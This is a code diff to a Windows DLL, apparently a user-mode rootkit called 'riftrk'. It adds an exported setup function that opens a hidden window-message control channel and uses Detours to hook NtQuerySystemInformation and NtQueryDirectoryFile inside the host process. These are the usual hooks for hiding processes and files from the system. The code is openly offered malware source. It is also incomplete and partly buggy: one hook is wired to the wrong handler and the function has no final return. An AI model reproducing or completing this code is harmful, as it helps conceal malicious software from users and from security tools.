@@ -1,9 +1,5 @@
 #include "riftrk.h"
 
-vec::OptiVec ProcessList;
-vec::OptiVec FileList;
-vec::OptiVec RegistryList;
-
 struct IOCtlTCtx {
 	HINSTANCE hInstDll;
 	HANDLE hReadEvent;
@@ -14,8 +10,8 @@ namespace rkc {
 	long __stdcall IOCtlHandler(
 		_In_     HWND   hWnd,
 		_In_     uint32 uMsg,
-		_In_opt_ long   wParam,
-		_In_opt_ long   lParam
+		_In_opt_ WPARAM wParam,
+		_In_opt_ LPARAM lParam
 	) {
 		switch (uMsg) {
 		case WM_COPYDATA: // IPC Message
@@ -55,12 +51,18 @@ namespace rkc {
 
 				return true;
 			}
+
+		// Message-Window Creation
+		case WM_NCCREATE:
+			return true;
+		case WM_CREATE:
+			return 0;
 		}
 
 		return DefWindowProcW(hWnd, uMsg, wParam, lParam);
 	}
 
-	dword __stdcall IOCtlSetup(
+	long __stdcall IOCtlSetup(
 		_In_opt_ void* lpParameter
 	) {
 		WNDCLASSEXW wc{};
@@ -98,7 +100,71 @@ namespace rkc {
 	}
 }
 
-extern NtQueryDirectoryFile_t NtQueryDirectoryFileO;
+extern "C" __declspec(dllexport) long __stdcall DbgSetupForLoadLib(
+	_In_opt_ void* lpParameter
+) {
+	// Setup IOCtl Handling (RootKit Control)
+	HANDLE h[2];
+	h[0] = CreateEventW(nullptr, false, false, nullptr);
+	IOCtlTCtx ctx = { (HINSTANCE)lpParameter, h[0] };
+	h[1] = CreateThread(nullptr, 0x1000, (LPTHREAD_START_ROUTINE)rkc::IOCtlSetup, &ctx, 0, nullptr);
+
+	WaitForMultipleObjects(2, h, false, INFINITE);
+	CloseHandle(h[0]);
+
+	dword ThreadExitCode;
+	GetExitCodeThread(h[1], &ThreadExitCode);
+	CloseHandle(h[1]);
+	if (ThreadExitCode != STILL_ACTIVE)
+		return false; // Indicated that something failed to load
+
+	// Detour Syscall-Thunks and Update all Threads
+	if (DetourTransactionBegin())
+		return false; // Couldn't Start Transaction
+	HANDLE hTSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+	if (hTSnap == INVALID_HANDLE_VALUE)
+		return false; // Invalid Snap
+
+	THREADENTRY32 te;
+	te.dwSize = sizeof(te);
+	HANDLE* hThread = nullptr;
+	uint16 nThread = 0;
+
+	if (Thread32First(hTSnap, &te)) {
+		do {
+			// Do not Update current Thread
+			if (te.th32ThreadID == GetCurrentThreadId())
+				continue;
+			if (te.th32OwnerProcessID == GetCurrentProcessId()) {
+				if (hThread)
+					hThread = (HANDLE*)realloc(hThread, (nThread + 1) * sizeof(HANDLE));
+				else
+					hThread = (HANDLE*)malloc((nThread + 1) * sizeof(HANDLE));
+
+				hThread[nThread] = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
+				DetourUpdateThread(hThread[nThread]);
+				nThread++;
+			}
+		} while (Thread32Next(hTSnap, &te));
+	} else {
+		CloseHandle(hTSnap);
+		return false; // Couldn't Find Threads
+	}
+	CloseHandle(hTSnap);
+
+	hk::NtQuerySystemInformation = (nt::NtQuerySystemInformation_t)
+		GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
+	DetourAttach(&(void*&)hk::NtQuerySystemInformation, hk::NtQuerySystemInformationHook);
+	hk::NtQueryDirectoryFile = (nt::NtQueryDirectoryFile_t)
+		GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryDirectoryFile");
+	DetourAttach(&(void*&)hk::NtQueryDirectoryFile, hk::NtQuerySystemInformationHook);
+
+	DetourTransactionCommit();
+
+	// CleanUp
+	for (uint32 i = 0; i < nThread; i++)
+		CloseHandle(hThread[i]);
+}
 
 BOOL WINAPI DllMain(
 	_In_ HINSTANCE hinstDLL,
@@ -107,79 +173,15 @@ BOOL WINAPI DllMain(
 ) {
 	UNREFERENCED_PARAMETER(pvReserved);
 
-	BreakPoint();
-
 	switch (fdwReason) {
 	case DLL_PROCESS_ATTACH:
-		{
-			{	// Setup IOCtl Handling (RootKit Control)
-				HANDLE h[2];
-				h[0] = CreateEventW(nullptr, false, false, nullptr);
-				IOCtlTCtx ctx = { hinstDLL, h[0] };
-				h[1] = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)rkc::IOCtlSetup, &ctx, 0, nullptr);
-
-				WaitForMultipleObjects(2, h, false, INFINITE);
-				CloseHandle(h[0]);
-
-				dword ThreadExitCode;
-				GetExitCodeThread(h[1], &ThreadExitCode);
-				CloseHandle(h[1]);
-				if (ThreadExitCode != STILL_ACTIVE)
-					return false; // Indicated that something failed to load
-			} {	// Setup Hooks ()
-
-				// Update all Threads
-				HANDLE hTSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-				if (hTSnap == INVALID_HANDLE_VALUE)
-					return false; // Invalid Snap
-				THREADENTRY32 te;
-				te.dwSize = sizeof(te);
-
-				HANDLE* hThread = nullptr;
-				uint16 nThread = 0;
-				if (Thread32First(hTSnap, &te)) {
-					if (DetourTransactionBegin())
-						return false; // Couldn't Start Transaction
-					do {
-						// Do not Update Current Thread
-						if (te.th32ThreadID == GetCurrentThreadId())
-							continue;
-
-						if (hThread)
-							hThread = (HANDLE*)realloc(hThread, (nThread + 1) * sizeof(HANDLE));
-						else
-							hThread = (HANDLE*)malloc((nThread + 1) * sizeof(HANDLE));
-
-						hThread[nThread] = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
-						DetourUpdateThread(hThread[nThread]);
-						nThread++;
-					} while (Thread32Next(hTSnap, &te));
-				} else {
-					CloseHandle(hTSnap);
-					return false; // Couldn't Find Threads
-				}
-
-				// Detour LoadLibrary Functions
-
-
-				DetourTransactionCommit();
-
-				// CleanUp
-				for (uchar i = 0; i < nThread; i++)
-					CloseHandle(hThread[i]);
-				CloseHandle(hTSnap);
-
-			}
-
-			return true;
-		}
+		return true;
 
 	case DLL_THREAD_ATTACH:
 	case DLL_THREAD_DETACH:
 	case DLL_PROCESS_DETACH:
-
 		break;
 	}
 
-	return true;
+	return 0;
 }
